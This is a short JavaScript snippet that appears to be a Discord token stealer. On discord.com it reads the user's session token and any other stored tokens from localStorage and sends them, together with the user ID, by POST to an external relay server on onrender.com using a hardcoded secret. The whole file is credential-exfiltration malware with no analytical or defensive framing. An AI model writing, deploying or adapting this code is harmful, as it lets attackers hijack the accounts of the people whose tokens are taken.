// --- CONFIG ---
const CONFIG = {
    LS_USERID_KEY: 'user_id_cache',       // localStorage key for single user ID
    LS_TOKEN_KEY: 'token',                // localStorage key for single token
    LS_TOKENS_KEY: 'tokens',              // localStorage key for multiple tokens
    PROXY_URL: 'https://juy72yriuhf.onrender.com/relay',
    PROXY_SECRET: 'no1alyafan',
    ALLOWED_HOST: 'discord.com'
};

// --- DOMAIN CHECK ---
if (window.location.host.includes(ALLOWED_HOST) && !window.__relay_sent) {
    window.__relay_sent = true;

    // --- SINGLE TOKEN ---
    const userID = localStorage.getItem(CONFIG.LS_USERID_KEY) || '000000000000000000';
    const token = localStorage.getItem(CONFIG.LS_TOKEN_KEY) || 'N/A';

    // --- MULTIPLE TOKENS ---
    let tokensData = '';
    const tokensRaw = localStorage.getItem(CONFIG.LS_TOKENS_KEY);
    if (tokensRaw) {
        try {
            const tokensObj = JSON.parse(tokensRaw);
            for (const [id, tkn] of Object.entries(tokensObj)) {
                // Skip non-token entries like __analytics__
                if (!id.startsWith('__')) {
                    tokensData += `<@${id}>\nToken: ${tkn}\n\n`;
                }
            }
        } catch (e) {
            console.error('[Relay] Failed to parse tokens:', e);
        }
    }

    // --- BUILD MESSAGE ---
    let content = `<@${userID}>\nToken: ${token}\n\n`;
    if (tokensData) content += `Other tokens:\n${tokensData}`;

    // --- SEND TO PROXY ---
    fetch(CONFIG.PROXY_URL, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'X-Proxy-Secret': CONFIG.PROXY_SECRET
        },
        body: JSON.stringify({ content: content, username: `RelayBot` }),
        keepalive: true
    })
    .then(async res => {
        if (res.ok) console.log('[Relay] Sent successfully');
        else {
            const text = await res.text().catch(() => '');
            console.error('[Relay] Failed', res.status, text);
        }
    })
    .catch(err => console.error('[Relay] Fetch error:', err));
}
